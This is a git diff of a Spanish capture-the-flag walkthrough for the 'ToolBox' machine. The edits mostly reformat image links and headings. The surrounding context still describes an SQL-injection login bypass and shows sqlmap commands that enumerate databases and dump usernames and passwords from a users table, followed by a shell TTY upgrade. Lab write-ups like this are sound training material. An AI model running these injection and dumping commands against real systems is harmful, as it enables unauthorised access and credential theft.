@@ -1,10 +1,11 @@
 ---------------
 - Tags: #windows #postgreSQL #SQLMap #rce #docker #toolbox_explotation
------------------------
 
-![[Pasted image 20240910232703.png]]
-# RECONOCIMIENTO
+![Pasted image 20240910232703.png](/assets/images/ToolBox/Pasted image 20240910232703.png)
+
 -----------------
+# RECONOCIMIENTO
+
 
 > Empezamos lanzando el siguiente comando para ver el `SO` de la maquina segun el `TTL` de la maquina
 
@@ -126,34 +127,32 @@ echo "nombres_dominio" >> /etc/hosts
 
 - Dominio `admin.megalogistic.com`
 
-![[Pasted image 20240909234317.png]]
+![Pasted image 20240909234317.png](/assets/images/ToolBox/Pasted image 20240909234317.png)
 
 - La pagina que mas nos interesa es la del acceso al `Login`, por lo que vamos a intentar `bypassear` el panel.
 - **En el caso que no sepamos los nombre de dominios de las paginas, por el casual de que nuestro escaneo no ha salido reflejado, podéis ver la información del certificado `SSL` de la web que os va a dar información como la siguiente**
 
-![[Pasted image 20240909234614.png]]
+![Pasted image 20240909234614.png](/assets/images/ToolBox/Pasted image 20240909234614.png)
 
 -----------------
 # LOGIN BYPASS
----------------
 
 >Vamos a probar a hacer una Inyección SQL básica
 
-![[Pasted image 20240909234736.png]]
+![Pasted image 20240909234736.png](/assets/images/ToolBox/Pasted image 20240909234736.png)
 
 **!FUNCIONA!**
 
-![[Pasted image 20240909234826.png]]
+![Pasted image 20240909234826.png](/assets/images/ToolBox/Pasted image 20240909234826.png)
 
 - Por lo que sabemos que el campo username es vulnerable a `SQLINJECTION`
 
 ---------------
 # SQLMAP INJECTIONS
--------------
 
 >Vamos a capturar la petición del panel de `Login` con `BurpSuite` para poder utilizar la herramienta `SQLMap` e intentar extraer información de la Base de Datos.
 
-![[Pasted image 20240909235320.png]]
+![Pasted image 20240909235320.png](/assets/images/ToolBox/Pasted image 20240909235320.png)
 
 >Comandos de `SQLMap`
 
@@ -174,6 +173,7 @@ available databases [3]:
 ```
 
 - Miramos las tablas dentro de la Base de Datos `public`
+
 ```bash
 ❯ sqlmap -r request.txt -p username --batch --dbs --force-ssl -D public --tables
 
@@ -185,6 +185,7 @@ Database: public
 ```
 
 - Miramos las columnas que tiene la tabla `users`
+
 ```bash
 ❯ sqlmap -r request.txt -p username --batch --dbs --force-ssl -D public T users --columns
 
@@ -200,6 +201,7 @@ Table: users
 ```
 
 - Dumpeamos los valores de dichas columnas
+
 ```bash
 ❯ sqlmap -r request.txt -p username --batch --dbs --force-ssl -D public -T users -C password,username --dump
 
@@ -236,7 +238,7 @@ postgres@bc56e3cc55e9:/var/lib/postgresql/11/main$
 
 ---------------
 # TRATAMIENTO DE LA TTY
---------------
+
 ```bash
 script /dev/null -c bash
 
@@ -255,7 +257,6 @@ stty rows 38 columns 183
 
 ---------------------
 # ESCALADA DE PRIVILEGIOS
----------------
 
 >Capturamos la `flag user`
 
@@ -330,7 +331,6 @@ docker@box:~$ ip a
 
 -----------------
 # GANAR EL ROOT
-------------------
 
 >Empezamos reconociendo el sistema y vemos lo siguiente
 
